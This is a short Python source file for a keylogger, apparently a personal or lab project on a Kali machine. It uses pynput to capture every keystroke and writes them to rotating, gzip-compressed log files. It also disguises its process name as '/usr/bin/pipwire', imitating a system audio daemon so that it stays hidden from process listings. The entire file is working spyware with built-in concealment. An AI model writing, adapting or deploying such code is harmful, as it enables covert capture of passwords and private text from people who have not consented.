from pynput.keyboard import Listener
import logging
import logging.handlers
import os
import gzip
import shutil
import setproctitle


class GZipRotator:
    def __call__(self, source, dest):
        with open(source, 'rb') as f_in, gzip.open(dest + '.gz', 'wb') as f_out:
            shutil.copyfileobj(f_in, f_out)
        os.remove(source)

def on_press(key):
    global current_log, logger
    try:
        current_log = current_log + str(key.char)
    except AttributeError:
        if key == key.space:
            current_log = current_log + " "
        elif key == key.enter:
            logger.info(current_log)
            current_log = ""
        else:
            logger.info(" " + str(key) + " ")
    except Exception as e:
        pass

def main():
    global current_log, logger
    setproctitle.setproctitle("/usr/bin/pipwire")
    # log file configuration
    log_directory = "/home/kali/PycharmProjects/KeyloggerProject/logs"
    log_filename = "keylogger.log"
    max_log_size = 1024 * 1024* 5
    backup_count = 5

    # Ensure log directory exists
    os.makedirs(log_directory, exist_ok=True)

    # Configure logging
    logger = logging.getLogger('KeyLogger')
    logger.setLevel(logging.INFO)
    handler = logging.handlers.RotatingFileHandler(
        filename=os.path.join(log_directory, log_filename),
        maxBytes=max_log_size,
        backupCount=backup_count
    )
    handler.rotator = GZipRotator()
    logger.addHandler(handler)

    current_log = ""

    try:
        with Listener(on_press=on_press) as listener:
            listener.join()
    except KeyboardInterrupt:
        pass

if __name__ == "__main__":
    main()